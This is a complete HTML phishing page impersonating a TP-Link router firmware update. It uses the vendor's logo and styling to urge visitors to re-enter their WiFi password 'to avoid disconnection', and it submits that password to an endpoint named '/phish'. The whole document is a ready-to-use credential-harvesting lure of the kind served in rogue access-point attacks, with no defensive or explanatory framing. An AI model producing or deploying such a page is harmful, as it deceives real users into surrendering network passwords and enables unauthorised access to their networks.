<!DOCTYPE html>
<html>
<head>
    <title>TP-Link Router Update</title>
    <link rel="icon" href="/static/logos/tplink.png">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f9f9f9; text-align: center; padding-top: 80px; }
        img { width: 100px; }
        h2 { color: #005bac; }
        input { padding: 10px; width: 250px; margin-top: 20px; }
        button { padding: 10px 20px; margin-top: 10px; background-color: #005bac; color: white; border: none; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 2px 10px rgba(0,0,0,0.1); display: inline-block; }
    </style>
</head>
<body>
    <div class="card">
        <img src="/static/logos/tplink.png" alt="TP-Link">
        <h2>TP-Link Router Firmware Update</h2>
        <p>To avoid disconnection, please re-enter your WiFi password to continue.</p>
        <form method="POST" action="/phish">
            <input type="password" name="password" placeholder="WiFi Password" required><br>
            <button type="submit">Update</button>
        </form>
    </div>
</body>
</html>
